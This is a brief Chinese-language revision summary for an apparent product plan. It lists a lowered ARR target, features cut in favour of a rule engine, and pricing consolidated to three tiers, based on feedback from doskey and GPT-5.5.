- **-** ARR 目标从 $1.5-3M 降到 $300-600K(更现实)
- **-** 砍掉数据飞轮的"贡献者排行榜"等运营功能
- **-** 砍掉本地小模型(Phase 1 不引入,纯规则引擎)
- **△** 定价从 5 档收敛为 3 档(Free / $19 Pro / $99 Crypto)
- **△** 客群描述更聚焦
- **△** 风险登记册精简

— *基于 doskey 与 GPT-5.5 反馈整理,2026-04-26*
